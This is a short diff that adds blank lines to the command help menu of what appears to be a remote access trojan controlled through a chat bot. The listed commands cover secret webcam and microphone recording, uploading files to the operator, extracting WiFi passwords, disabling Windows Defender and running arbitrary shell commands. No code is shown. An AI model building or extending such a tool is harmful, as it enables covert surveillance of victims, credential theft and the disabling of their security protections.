@@ -27,6 +27,7 @@ https://www.youtube.com/watch?v=UQrcOj63S2o
 
 📌 MEDIA CAPTURE
 ────────────────────────
+
 webcam           - Take webcam photo
 
 webcam 10        - Record webcam video (seconds)
@@ -35,6 +36,7 @@ audio 10         - Record microphone audio (seconds)
 
 📌 FILE OPERATIONS
 ────────────────────────
+
 ls               - List files in current directory
 
 cd folder        - Change to folder
@@ -47,6 +49,7 @@ upload file.txt  - Upload file to me
 
 📌 SYSTEM INFORMATION
 ────────────────────────
+
 sysinfo          - Show system information
 
 ps               - List running processes
@@ -59,6 +62,7 @@ wifi             - Extract WiFi passwords
 
 📌 SYSTEM CONTROL
 ────────────────────────
+
 shutdown         - Shutdown computer
 
 reboot           - Restart computer
@@ -69,6 +73,7 @@ defender         - Disable Windows Defender
 
 📌 UTILITIES
 ────────────────────────
+
 cmd command      - Execute shell command
 
 pwd              - Show current directory
